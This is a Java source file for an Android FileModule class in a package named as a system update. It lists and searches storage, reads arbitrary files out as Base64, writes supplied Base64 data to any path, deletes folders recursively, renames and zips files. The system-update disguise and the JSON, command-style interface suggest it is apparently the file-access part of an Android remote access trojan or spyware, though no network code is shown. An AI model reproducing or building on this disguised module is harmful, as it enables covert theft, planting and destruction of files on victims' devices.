package com.android.system.update.modules;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;
import android.webkit.MimeTypeMap;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONException;

public class FileModule {
    private static final String TAG = "FileModule";
    private Context context;
    private static final int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit for transfers
    
    public FileModule(Context context) {
        this.context = context;
        Log.d(TAG, "FileModule initialized");
    }
    
    public String listFiles(String path) {
        Log.d(TAG, "========== listFiles called ==========");
        Log.d(TAG, "Requested path: " + path);
        
        try {
            File dir;
            if (path == null || path.isEmpty() || path.equals("/")) {
                dir = Environment.getExternalStorageDirectory();
                Log.d(TAG, "Using default external storage: " + dir.getAbsolutePath());
            } else {
                dir = new File(path);
                Log.d(TAG, "Using provided path: " + dir.getAbsolutePath());
            }
            
            Log.d(TAG, "Directory exists: " + dir.exists());
            Log.d(TAG, "Directory can read: " + dir.canRead());
            Log.d(TAG, "Directory is directory: " + dir.isDirectory());
            Log.d(TAG, "Directory absolute path: " + dir.getAbsolutePath());
            Log.d(TAG, "Directory free space: " + dir.getFreeSpace());
            Log.d(TAG, "Directory total space: " + dir.getTotalSpace());
            
            if (!dir.exists()) {
                Log.e(TAG, "ERROR: Directory does not exist: " + path);
                JSONObject error = new JSONObject();
                error.put("error", "Directory does not exist");
                error.put("path", path);
                error.put("success", false);
                return error.toString();
            }
            
            if (!dir.canRead()) {
                Log.e(TAG, "ERROR: Cannot read directory - permission denied: " + path);
                JSONObject error = new JSONObject();
                error.put("error", "Cannot read directory - permission denied");
                error.put("path", path);
                error.put("success", false);
                return error.toString();
            }
            
            JSONObject result = new JSONObject();
            result.put("current_path", dir.getAbsolutePath());
            result.put("parent_path", dir.getParent() != null ? dir.getParent() : "");
            result.put("success", true);
            
            JSONArray filesList = new JSONArray();
            File[] files = dir.listFiles();
            
            Log.d(TAG, "Files array from listFiles(): " + (files == null ? "null" : files.length + " items"));
            
            if (files != null) {
                Log.d(TAG, "Iterating through " + files.length + " files");
                int fileCount = 0;
                int dirCount = 0;
                
                for (File file : files) {
                    if (file.isDirectory()) {
                        dirCount++;
                    } else {
                        fileCount++;
                    }
                    
                    Log.d(TAG, "Processing: " + file.getAbsolutePath() + 
                        " | Name: " + file.getName() +
                        " | IsDir: " + file.isDirectory() + 
                        " | Size: " + file.length() + 
                        " | Hidden: " + file.isHidden() +
                        " | Readable: " + file.canRead() +
                        " | Writable: " + file.canWrite());
                    
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("isDirectory", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("lastModified", file.lastModified());
                    fileObj.put("canRead", file.canRead());
                    fileObj.put("canWrite", file.canWrite());
                    fileObj.put("isHidden", file.isHidden());
                    
                    if (!file.isDirectory()) {
                        String extension = getFileExtension(file.getName());
                        String mimeType = getMimeType(file.getName());
                        fileObj.put("extension", extension);
                        fileObj.put("mimeType", mimeType);
                        Log.d(TAG, "  -> File type - Extension: " + extension + ", MIME: " + mimeType);
                    }
                    
                    filesList.put(fileObj);
                }
                
                Log.d(TAG, "Summary: Found " + dirCount + " directories and " + fileCount + " files");
                Log.d(TAG, "Total files added to JSON: " + filesList.length());
            } else {
                Log.e(TAG, "WARNING: listFiles() returned null for directory: " + path);
                
                // Try alternative method for Android 10+
                Log.d(TAG, "Attempting alternative listing method...");
                
                try {
                    // Alternative: try to list using absolute path with File.list()
                    String[] fileNames = dir.list();
                    if (fileNames != null) {
                        Log.d(TAG, "Alternative listing found " + fileNames.length + " files via list()");
                        for (String name : fileNames) {
                            File file = new File(dir, name);
                            Log.d(TAG, "  -> Found via alternative: " + name);
                            
                            JSONObject fileObj = new JSONObject();
                            fileObj.put("name", file.getName());
                            fileObj.put("path", file.getAbsolutePath());
                            fileObj.put("isDirectory", file.isDirectory());
                            fileObj.put("size", file.length());
                            fileObj.put("lastModified", file.lastModified());
                            fileObj.put("canRead", file.canRead());
                            fileObj.put("canWrite", file.canWrite());
                            fileObj.put("isHidden", file.isHidden());
                            
                            if (!file.isDirectory()) {
                                String extension = getFileExtension(file.getName());
                                fileObj.put("extension", extension);
                                fileObj.put("mimeType", getMimeType(file.getName()));
                            }
                            
                            filesList.put(fileObj);
                        }
                    } else {
                        Log.e(TAG, "Alternative listing also returned null");
                        
                        // Try one more method - check if we have MANAGE_EXTERNAL_STORAGE permission
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                            if (!Environment.isExternalStorageManager()) {
                                Log.e(TAG, "MANAGE_EXTERNAL_STORAGE permission not granted");
                            }
                        }
                    }
                } catch (SecurityException se) {
                    Log.e(TAG, "Security exception in alternative listing: " + se.getMessage());
                }
            }
            
            result.put("files", filesList);
            result.put("total", filesList.length());
            
            Log.d(TAG, "Final JSON result prepared with " + filesList.length() + " files");
            Log.d(TAG, "========== listFiles complete ==========");
            
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in listFiles", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in listFiles", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in listFiles", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String getFile(String path) {
        Log.d(TAG, "getFile called for path: " + path);
        
        try {
            File file = new File(path);
            Log.d(TAG, "File exists: " + file.exists());
            Log.d(TAG, "File can read: " + file.canRead());
            Log.d(TAG, "File size: " + file.length());
            
            if (!file.exists()) {
                Log.e(TAG, "File not found: " + path);
                return createErrorResponse("File not found");
            }
            
            if (!file.canRead()) {
                Log.e(TAG, "Cannot read file - permission denied: " + path);
                return createErrorResponse("Cannot read file - permission denied");
            }
            
            if (file.length() > MAX_FILE_SIZE) {
                Log.e(TAG, "File too large: " + file.length() + " bytes");
                return createErrorResponse("File too large (max " + (MAX_FILE_SIZE/1024/1024) + "MB)");
            }
            
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            int read = fis.read(bytes);
            fis.close();
            
            Log.d(TAG, "File read successfully, bytes read: " + read);
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("name", file.getName());
            response.put("size", file.length());
            response.put("data", Base64.encodeToString(bytes, Base64.DEFAULT));
            response.put("mimeType", getMimeType(file.getName()));
            
            Log.d(TAG, "File encoded to Base64, length: " + bytes.length);
            
            return response.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in getFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in getFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in getFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String deleteFile(String path) {
        Log.d(TAG, "deleteFile called for path: " + path);
        
        try {
            File file = new File(path);
            Log.d(TAG, "File exists: " + file.exists());
            Log.d(TAG, "Is directory: " + file.isDirectory());
            
            if (!file.exists()) {
                Log.e(TAG, "File not found: " + path);
                return createErrorResponse("File not found");
            }
            
            boolean deleted;
            if (file.isDirectory()) {
                Log.d(TAG, "Deleting directory recursively");
                deleted = deleteDirectory(file);
            } else {
                Log.d(TAG, "Deleting single file");
                deleted = file.delete();
            }
            
            Log.d(TAG, "Delete result: " + deleted);
            
            if (deleted) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Deleted successfully");
                response.put("path", path);
                return response.toString();
            } else {
                Log.e(TAG, "Failed to delete: " + path);
                return createErrorResponse("Failed to delete");
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in deleteFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in deleteFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in deleteFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private boolean deleteDirectory(File directory) {
        Log.d(TAG, "deleteDirectory called for: " + directory.getAbsolutePath());
        
        if (directory.exists()) {
            File[] files = directory.listFiles();
            if (files != null) {
                Log.d(TAG, "Found " + files.length + " items to delete");
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteDirectory(file);
                    } else {
                        boolean deleted = file.delete();
                        Log.d(TAG, "Deleted file: " + file.getName() + " - " + deleted);
                    }
                }
            }
        }
        boolean result = directory.delete();
        Log.d(TAG, "Directory deleted: " + result);
        return result;
    }
    
    public String createFolder(String path, String folderName) {
        Log.d(TAG, "createFolder called - path: " + path + ", folderName: " + folderName);
        
        try {
            File folder = new File(path, folderName);
            Log.d(TAG, "Full folder path: " + folder.getAbsolutePath());
            Log.d(TAG, "Folder already exists: " + folder.exists());
            
            if (folder.exists()) {
                Log.e(TAG, "Folder already exists");
                return createErrorResponse("Folder already exists");
            }
            
            boolean created = folder.mkdirs();
            Log.d(TAG, "Folder created: " + created);
            
            if (created) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Folder created");
                response.put("path", folder.getAbsolutePath());
                return response.toString();
            } else {
                Log.e(TAG, "Failed to create folder");
                return createErrorResponse("Failed to create folder");
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in createFolder", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in createFolder", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in createFolder", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String renameFile(String oldPath, String newName) {
        Log.d(TAG, "renameFile called - oldPath: " + oldPath + ", newName: " + newName);
        
        try {
            File oldFile = new File(oldPath);
            File parent = oldFile.getParentFile();
            File newFile = new File(parent, newName);
            
            Log.d(TAG, "Old file exists: " + oldFile.exists());
            Log.d(TAG, "New file path: " + newFile.getAbsolutePath());
            Log.d(TAG, "New file already exists: " + newFile.exists());
            
            if (newFile.exists()) {
                Log.e(TAG, "A file with that name already exists");
                return createErrorResponse("A file with that name already exists");
            }
            
            boolean renamed = oldFile.renameTo(newFile);
            Log.d(TAG, "Rename result: " + renamed);
            
            if (renamed) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Renamed successfully");
                response.put("newPath", newFile.getAbsolutePath());
                return response.toString();
            } else {
                Log.e(TAG, "Failed to rename");
                return createErrorResponse("Failed to rename");
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in renameFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in renameFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in renameFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String uploadFile(String path, String fileName, String base64Data) {
        Log.d(TAG, "uploadFile called - path: " + path + ", fileName: " + fileName);
        
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                Log.d(TAG, "Creating directory: " + path);
                dir.mkdirs();
            }
            
            File file = new File(dir, fileName);
            Log.d(TAG, "Full file path: " + file.getAbsolutePath());
            
            byte[] bytes = Base64.decode(base64Data, Base64.DEFAULT);
            Log.d(TAG, "Decoded Base64 data, size: " + bytes.length + " bytes");
            
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(bytes);
            fos.close();
            
            Log.d(TAG, "File written successfully");
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "File uploaded");
            response.put("path", file.getAbsolutePath());
            response.put("size", bytes.length);
            
            return response.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in uploadFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in uploadFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in uploadFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String zipFile(String path) {
        Log.d(TAG, "zipFile called for path: " + path);
        
        try {
            File source = new File(path);
            File zipFile = new File(source.getParent(), source.getName() + ".zip");
            
            Log.d(TAG, "Source exists: " + source.exists());
            Log.d(TAG, "Source is directory: " + source.isDirectory());
            Log.d(TAG, "Zip file path: " + zipFile.getAbsolutePath());
            
            if (zipFile.exists()) {
                Log.d(TAG, "Removing existing zip file");
                zipFile.delete();
            }
            
            FileOutputStream fos = new FileOutputStream(zipFile);
            ZipOutputStream zos = new ZipOutputStream(fos);
            
            if (source.isDirectory()) {
                Log.d(TAG, "Zipping directory: " + source.getName());
                zipDirectory(source, source.getName(), zos);
            } else {
                Log.d(TAG, "Zipping file: " + source.getName());
                zipFile(source, source.getName(), zos);
            }
            
            zos.close();
            fos.close();
            
            Log.d(TAG, "Zip completed, size: " + zipFile.length());
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "Zipped successfully");
            response.put("path", zipFile.getAbsolutePath());
            response.put("size", zipFile.length());
            
            return response.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in zipFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in zipFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in zipFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private void zipDirectory(File folder, String parentFolder, ZipOutputStream zos) throws Exception {
        Log.d(TAG, "Zipping directory: " + folder.getAbsolutePath());
        
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    zipDirectory(file, parentFolder + "/" + file.getName(), zos);
                } else {
                    zipFile(file, parentFolder + "/" + file.getName(), zos);
                }
            }
        }
    }
    
    private void zipFile(File file, String entryName, ZipOutputStream zos) throws Exception {
        Log.d(TAG, "Zipping file: " + file.getName() + " as " + entryName);
        
        byte[] buffer = new byte[1024];
        FileInputStream fis = new FileInputStream(file);
        zos.putNextEntry(new ZipEntry(entryName));
        
        int length;
        while ((length = fis.read(buffer)) > 0) {
            zos.write(buffer, 0, length);
        }
        
        zos.closeEntry();
        fis.close();
    }
    
    public String searchFiles(String path, String query) {
        Log.d(TAG, "searchFiles called - path: " + path + ", query: " + query);
        
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                Log.e(TAG, "Invalid directory: " + path);
                return createErrorResponse("Invalid directory");
            }
            
            JSONArray results = new JSONArray();
            searchInDirectory(dir, query.toLowerCase(), results);
            
            Log.d(TAG, "Search found " + results.length() + " results");
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("results", results);
            response.put("count", results.length());
            
            return response.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in searchFiles", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in searchFiles", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in searchFiles", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private void searchInDirectory(File dir, String query, JSONArray results) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.getName().toLowerCase().contains(query)) {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", file.getName());
                fileObj.put("path", file.getAbsolutePath());
                fileObj.put("isDirectory", file.isDirectory());
                fileObj.put("size", file.length());
                fileObj.put("lastModified", file.lastModified());
                results.put(fileObj);
                
                Log.d(TAG, "Search match: " + file.getAbsolutePath());
            }
            
            if (file.isDirectory()) {
                searchInDirectory(file, query, results);
            }
        }
    }
    
    public String getStorageInfo() {
        Log.d(TAG, "getStorageInfo called");
        
        try {
            JSONObject info = new JSONObject();
            
            // Internal storage
            File internal = Environment.getExternalStorageDirectory();
            if (internal != null) {
                JSONObject internalInfo = new JSONObject();
                internalInfo.put("path", internal.getAbsolutePath());
                internalInfo.put("total", internal.getTotalSpace());
                internalInfo.put("free", internal.getFreeSpace());
                internalInfo.put("used", internal.getTotalSpace() - internal.getFreeSpace());
                info.put("internal", internalInfo);
                
                Log.d(TAG, "Internal storage - Path: " + internal.getAbsolutePath());
                Log.d(TAG, "Internal storage - Total: " + internal.getTotalSpace());
                Log.d(TAG, "Internal storage - Free: " + internal.getFreeSpace());
            }
            
            // Check for external SD card
            File[] externalFiles = context.getExternalFilesDirs(null);
            if (externalFiles.length > 1 && externalFiles[1] != null) {
                JSONObject externalInfo = new JSONObject();
                externalInfo.put("path", externalFiles[1].getAbsolutePath());
                externalInfo.put("available", true);
                info.put("external", externalInfo);
                
                Log.d(TAG, "External storage found: " + externalFiles[1].getAbsolutePath());
            }
            
            info.put("success", true);
            return info.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in getStorageInfo", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in getStorageInfo", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private String getFileExtension(String fileName) {
        int lastDot = fileName.lastIndexOf('.');
        if (lastDot > 0 && lastDot < fileName.length() - 1) {
            return fileName.substring(lastDot + 1).toLowerCase();
        }
        return "";
    }
    
    private String getMimeType(String fileName) {
        String extension = getFileExtension(fileName);
        if (extension.isEmpty()) return "application/octet-stream";
        
        MimeTypeMap mime = MimeTypeMap.getSingleton();
        String type = mime.getMimeTypeFromExtension(extension);
        return type != null ? type : "application/octet-stream";
    }
    
    private String createErrorResponse(String message) {
        try {
            JSONObject error = new JSONObject();
            error.put("success", false);
            error.put("error", message);
            return error.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + message + "\"}";
        }
    }
}
